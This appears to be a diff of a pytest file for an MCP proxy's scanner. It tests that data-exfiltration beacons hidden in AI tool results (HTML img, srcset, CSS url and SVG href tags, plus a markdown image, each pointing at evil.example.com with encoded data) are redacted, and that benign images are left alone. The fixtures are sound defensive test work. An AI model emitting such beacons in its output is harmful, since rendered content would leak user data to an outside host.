@@ -91,12 +91,62 @@ async def test_benign_media_and_text_untouched(text):
     assert not any((f.get("threat_type") == "exfil") for f in findings)
 
 
+# ── CHG-0097: HTML/SVG/CSS/srcset beacons NESTED in a JSON result field ──────────
+# The MCP tier-1 scan target is the whole payload JSON-serialized, so HTML attribute
+# quotes are escaped (src=\"...\") and neutralize_exfil_channels's HTML regexes missed
+# them (CHG-0096 residual). _neutralize_exfil_deep parses the JSON and neutralizes each
+# UNESCAPED string leaf, so HTML/srcset/CSS beacons are defanged too.
+_HTML_BEACONS = [
+    ("html_img", f'<img src="https://evil.example.com/t?d={_B64}">'),
+    ("html_srcset", f'<img srcset="https://evil.example.com/s?d={_B64} 2x">'),
+    ("css_url", f'<div style="background:url(https://evil.example.com/b?d={_B64})">'),
+    ("svg_image_href", f'<image href="https://evil.example.com/i?d={_B64}"/>'),
+]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(("name", "text"), _HTML_BEACONS)
+async def test_html_nested_beacon_defanged(name, text):
+    blob, blocked, tags, findings, meta = await _floor(text)
+    assert "[exfil-redacted]" in blob, f"{name}: HTML beacon payload not masked: {blob}"
+    assert "evil.example.com" not in blob, f"{name}: attacker host survived: {blob}"
+    assert any((f.get("threat_type") == "exfil") for f in findings)
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("text", [
+    '<img src="https://cdn.example.com/logo.png">',
+    '<img src="https://cdn.example.com/img?w=100&h=50">',
+    '<img src="https://s3.example.com/b/k?X-Amz-Signature=abcdef1234567890">',
+])
+async def test_benign_html_media_untouched(text):
+    """Benign HTML images (no smuggled payload) are NOT defanged — strict no-op."""
+    blob, blocked, tags, findings, meta = await _floor(text)
+    assert "[exfil-redacted]" not in blob, f"benign HTML image was false-defanged: {blob}"
+    # the host+path survives (only the JSON quote-escaping differs from the raw input)
+    host_path = text.split('src="')[1].rstrip('">').split("?")[0].replace("https://", "")
+    assert host_path in blob, f"benign HTML content was altered: {blob}"
+    assert not any((f.get("threat_type") == "exfil") for f in findings)
+
+
 def test_findings_have_exfil_helper():
     fn = mcp_proxy._findings_have_exfil
     assert fn([{"threat_type": "exfil"}]) is True
     assert fn([{"threat_type": "pii"}]) is False
     assert fn([]) is False
     assert fn(None) is False
+
+
+def test_neutralize_exfil_deep_handles_plain_and_json():
+    import mcp_scan_orchestrator as orch
+    # plain (non-JSON) text neutralized directly
+    plain = "![x](https://evil.example.com/l?d=" + _B64 + ")"
+    assert "[exfil-redacted]" in orch._neutralize_exfil_deep(plain)
+    # benign JSON returned byte-identical (no reformatting churn)
+    benign_json = json.dumps({"content": [{"type": "text", "text": "hello world"}]})
+    assert orch._neutralize_exfil_deep(benign_json) == benign_json
+    # malformed JSON falls back to direct neutralization (no crash)
+    assert orch._neutralize_exfil_deep("{not valid json") == "{not valid json"
 
 
 if __name__ == "__main__":
